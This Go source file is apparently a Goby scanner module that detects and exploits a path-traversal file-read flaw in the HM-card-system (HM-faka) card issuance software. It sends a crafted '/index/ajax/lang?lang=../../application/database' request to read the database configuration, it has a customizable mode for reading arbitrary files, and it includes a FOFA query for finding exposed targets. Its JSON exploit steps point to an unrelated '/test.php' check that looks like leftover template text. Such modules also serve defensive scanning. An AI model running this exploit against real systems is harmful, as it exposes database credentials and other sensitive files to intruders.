package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HM-card-system /index/chadan/queryorderpage File Read Vulnerability",
    "Description": "<p>The Red Alliance Card Issuance System is a software system used to manage the issuance of cards. Attackers read sensitive system information by constructing special URL addresses.</p>",
    "Product": "HM-card-system",
    "Homepage": "https://github.com/cnmbdb/HM-faka",
    "DisclosureDate": "2024-06-04",
    "PostTime": "2024-06-04",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"assets/shop/dist/uaredirect.js\"",
    "GobyQuery": "body=\"assets/shop/dist/uaredirect.js\"",
    "Level": "3",
    "Impact": "<p>Attackers read sensitive system information by constructing special URL addresses.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please try to contact the developer to fix the bug: <a href=\"https://github.com/cnmbdb/HM-faka\">https://github.com/cnmbdb/HM-faka</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls. </p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "database,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../../application/database",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index/ajax/lang?lang=../../application/database",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "hostname",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "红盟发卡系统 /index/chadan/queryorderpage 文件读取漏洞",
            "Product": "红盟发卡系统",
            "Description": "<p>红盟发卡系统是一种用于管理发行卡片的软件系统。攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户尝试联系开发者修复漏洞：<a href=\"https://github.com/cnmbdb/HM-faka\" target=\"_blank\">https://github.com/cnmbdb/HM-faka</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "HM-card-system /index/chadan/queryorderpage File Read Vulnerability",
            "Product": "HM-card-system",
            "Description": "<p>The Red Alliance Card Issuance System is a software system used to manage the issuance of cards. Attackers read sensitive system information by constructing special URL addresses.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please try to contact the developer to fix the bug:&nbsp;<a href=\"https://github.com/cnmbdb/HM-faka\" target=\"_blank\">https://github.com/cnmbdb/HM-faka</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.&nbsp;</p><p>3. Keep the system off the public web if it is not necessary.<br></p>",
            "Impact": "<p>Attackers read sensitive system information by constructing special URL addresses.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10959"
}`

	postOrGet_AAAAA1717482158 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		url := "/index/ajax/lang?lang=" + fileUrl + ""
		resp, err := setGetRequest(hostInfo, url, map[string]string{})
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/index/ajax/lang"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../../application/database": "hostname",
			}
			// 函数继承
			uploadFileFunc := postOrGet_AAAAA1717482158

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"database": {"../../application/database", "hostname"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_AAAAA1717482158

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
